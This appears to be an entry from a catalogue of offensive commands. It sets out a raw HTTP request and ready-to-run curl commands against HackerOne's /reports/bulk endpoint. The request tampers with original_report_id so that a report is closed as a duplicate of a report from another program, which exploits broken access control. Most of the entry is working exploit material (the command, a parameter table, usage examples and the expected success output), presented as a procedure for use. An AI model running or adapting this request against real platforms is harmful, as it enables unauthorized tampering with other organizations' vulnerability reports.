---
data: >-
  POST /reports/bulk HTTP/2

  Host: hackerone.com

  Cookie: <USER B Cookies>

  User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0)
  Gecko/20100101 Firefox/126.0

  Accept: */*

  Accept-Language: en-US,en;q=0.5

  Accept-Encoding: gzip, deflate, br

  Referer: https://hackerone.com/reports/2424755

  X-Csrf-Token: <USER B CSRF TOKEN>

  Content-Type: application/x-www-form-urlencoded; charset=UTF-8

  X-Requested-With: XMLHttpRequest

  X-Datadog-Origin: rum

  X-Datadog-Parent-Id: 2173163794632761452

  X-Datadog-Sampling-Priority: 1

  X-Datadog-Trace-Id: 3844362884923386826

  Content-Length: 289

  Origin: https://hackerone.com

  Sec-Fetch-Dest: empty

  Sec-Fetch-Mode: cors

  Sec-Fetch-Site: same-origin

  Te: trailers


  message=s&substate=duplicate&original_report_id=███████&reference=&add_reporter_to_original=false&reply_action=close-report&mark_ineligible_for_bounty=false&unassign_report_on_close=false&code_review_patch=&code_review_diff_url=&reports_count=1&report_ids%5B%5D=<sandbox_report_id>&bounty_currency=USD
tags:
  - http-post
  - exploit
  - hackerone
type: command
output: HTTP/2 200 OK
executor: curl
platforms:
  - Web
created_at: '2024-01-01T00:00:00Z'
updated_at: '2025-12-14T17:30:46.969Z'
id: 868ae4f1-fcd7-40d9-9289-37c9250b4d54
verified: false
validated: true
submitted: true
---
# hackerone-bulk-report-close

## Command

```bash
curl -X POST 'https://hackerone.com/reports/bulk' \
  -H 'Cookie: <USER B Cookies>' \
  -H 'X-Csrf-Token: <USER B CSRF TOKEN>' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-raw 'message=s&substate=duplicate&original_report_id=███████&reference=&add_reporter_to_original=false&reply_action=close-report&mark_ineligible_for_bounty=false&unassign_report_on_close=false&code_review_patch=&code_review_diff_url=&reports_count=1&report_ids%5B%5D=<sandbox_report_id>&bounty_currency=USD'
```

## Description

This curl command replicates the modified HTTP POST request to HackerOne's /reports/bulk endpoint, closing a specified report as a duplicate of an unauthorized external report by tampering with original_report_id. Used to exploit broken access controls for cross-program actions.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| original_report_id | ID of the report to mark as the duplicate source (tamper to external ID) | Yes |
| report_ids[] | Array of report IDs to close (sandbox target) | Yes |
| substate | Closure reason (set to 'duplicate') | Yes |
| message | Status flag (e.g., 's') | Yes |
| X-Csrf-Token | User's CSRF token for authentication | Yes |
| Cookie | User's session cookies | Yes |
| reports_count | Number of reports (1 for single) | Yes |
| reply_action | Action type ('close-report') | Yes |

## Examples

### Basic Usage

```bash
curl -X POST 'https://hackerone.com/reports/bulk' -H 'Cookie: <cookies>' -H 'X-Csrf-Token: <token>' --data-raw 'substate=duplicate&original_report_id=123&report_ids%5B%5D=456&reports_count=1'
```

### Advanced Usage

Include full headers and parameters as in the tampered request for exploitation.

```bash
curl -X POST 'https://hackerone.com/reports/bulk' \
  -H 'User-Agent: Mozilla/5.0 ...' \
  -H 'Referer: https://hackerone.com/reports/2424755' \
  --data-raw 'message=s&substate=duplicate&original_report_id=███████&...'
```

## Expected Output

HTTP/2 200 OK response body indicating successful closure, e.g., JSON with updated report status. No error if bypass succeeds; report marked as duplicate in dashboard.

## Related

- [[procedures/Modify-and-Execute-Cross-Program-Duplicate-Closure]]
